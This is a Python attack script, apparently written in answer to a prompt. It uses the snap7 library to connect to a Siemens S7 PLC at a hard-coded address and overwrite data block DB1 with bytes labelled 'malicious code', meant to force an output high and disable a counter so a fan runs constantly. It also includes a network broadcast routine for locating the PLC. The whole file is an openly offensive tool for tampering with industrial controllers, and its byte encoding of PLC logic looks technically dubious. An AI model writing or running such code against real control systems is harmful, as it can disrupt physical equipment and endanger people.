import snap7
import struct
import time
import logging
import socket  # for finding IP address (if needed)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Constants
PLC_IP = "192.168.9.24"  # Default PLC IP (from the provided config)
RACK = 0
SLOT = 1
DB_NUMBER = 1  #  Assuming we will write to a non-existent DB1
START_ADDRESS = 0
BYTE_LENGTH = 10  # Number of bytes to overwrite

# Malicious code in byte form (example: sets Q0.0 high for longer than intended, disables the counter)
#  This is a *VERY* simplified example.  Real malicious code would be far more complex.
#  This example replaces the first few bytes of Rung 0 with code that directly sets Q0.0 high.
#  It also attempts to disable the counter to ensure the fan always runs.
#  This is just a demonstration; it's not robust or complete PLC code.
malicious_code = bytearray([
    0xA2, 0x00, # Set output memory Q0.0 to 1 (A 2 = Set, 00 = bit 0 of byte address 0 (Q0.0))
    0x00,       # NOP
    0x00,        # NOP
    0x00, 0x00, 0x00, 0x00,   # NOP, NOP, NOP, NOP - padding out
    0x00, 0x00 # NOP, NOP
])
# Make sure malicious_code length is equal to BYTE_LENGTH
if len(malicious_code) < BYTE_LENGTH:
    malicious_code += b'\x00' * (BYTE_LENGTH - len(malicious_code))
elif len(malicious_code) > BYTE_LENGTH:
    malicious_code = malicious_code[:BYTE_LENGTH]

def find_plc_ip():
    """
    Attempts to find the PLC IP address by scanning the network.
    This is a very basic example and might not work in all network configurations.
    """
    try:
        # Create a socket for UDP broadcast
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(2)  # Timeout after 2 seconds

        # Broadcast a discovery message
        message = b"S7_PING"  # A simple ping message
        sock.sendto(message, ('<broadcast>', 5005))  # Send to broadcast address and port

        # Listen for a response
        try:
            data, addr = sock.recvfrom(1024)
            logging.info(f"Received response: {data} from {addr}")
            return addr[0]  # Return the IP address of the sender
        except socket.timeout:
            logging.warning("No PLC response received within timeout.")
            return None

    except Exception as e:
        logging.error(f"Error finding PLC IP: {e}")
        return None
    finally:
        sock.close()


def modify_plc_program(plc_ip, db_number, start_address, data):
    """
    Modifies the PLC program by writing data to a specific DB.

    Args:
        plc_ip (str): The IP address of the PLC.
        db_number (int): The number of the data block to write to.
        start_address (int): The starting address within the DB to write to.
        data (bytes): The data to write to the DB.
    """
    try:
        # Create a Snap7 client
        client = snap7.client.Client()

        # Connect to the PLC
        client.connect(plc_ip, RACK, SLOT)
        logging.info(f"Connected to PLC at {plc_ip}")

        #Check if the DB exists and is writeable.  This code writes to a non-existent DB in the original prompt.
        #In a real attack, the attacker might overwrite existing code or data.  This is just a demonstration
        try:
            db_size = client.db_get(db_number)
            logging.warning(f"DB{db_number} already exists with size {db_size}. Overwriting data!")

        except snap7.exceptions.Snap7Exception as e:
            if "DB not present" in str(e):
                logging.info(f"DB{db_number} does not exist.  Attempting to write anyway.")
            else:
                logging.error(f"Error checking DB: {e}")
                client.disconnect()
                return


        # Write the malicious code to the DB
        client.db_write(db_number, start_address, data)  # Write data to DB
        logging.info(f"Successfully wrote {len(data)} bytes to DB{db_number} at address {start_address}")

    except Exception as e:
        logging.error(f"An error occurred: {e}")
    finally:
        # Disconnect from the PLC
        if 'client' in locals() and client.get_connected():
            client.disconnect()
            logging.info("Disconnected from PLC.")

if __name__ == "__main__":
    # 1. Find the PLC IP address (optional)
    # plc_ip = find_plc_ip()
    # if not plc_ip:
    #     logging.error("Could not find PLC IP address.  Using default IP.")
    #     plc_ip = PLC_IP
    # else:
    #     logging.info(f"Found PLC IP address: {plc_ip}")

    plc_ip = PLC_IP # using the PLC ip from the config

    # 2. Modify the PLC program with malicious code
    modify_plc_program(plc_ip, DB_NUMBER, START_ADDRESS, malicious_code)

    logging.info("Script execution completed.")